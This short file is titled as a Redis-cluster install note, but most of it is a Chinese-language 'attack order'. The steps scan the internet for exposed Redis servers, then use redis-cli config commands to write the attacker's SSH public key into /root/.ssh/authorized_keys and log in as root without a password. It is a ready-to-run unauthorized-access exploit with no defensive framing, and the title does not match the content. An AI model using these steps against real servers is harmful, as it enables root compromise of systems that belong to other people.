# Install Redis-cluster 


------


make sure that you have the correct redis environment

------


攻击顺序:
1.在公网内搜索开放外网地址的redis,并且能够进入到redis的cli中
2.redis-cli -h ${ip} -p 6379 config set dir /root/.ssh
3.redis-cli -h ${ip} -p 6379 config set dbfilename authorized_keys
4.(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > my.pub
5.cat my.pub | redis-cli -h ${ip} -p 6379 -x set crackit
6.redis-cli -h ${ip} -p 6379 save
7. ssh root@${ip} 这时能够免密能录
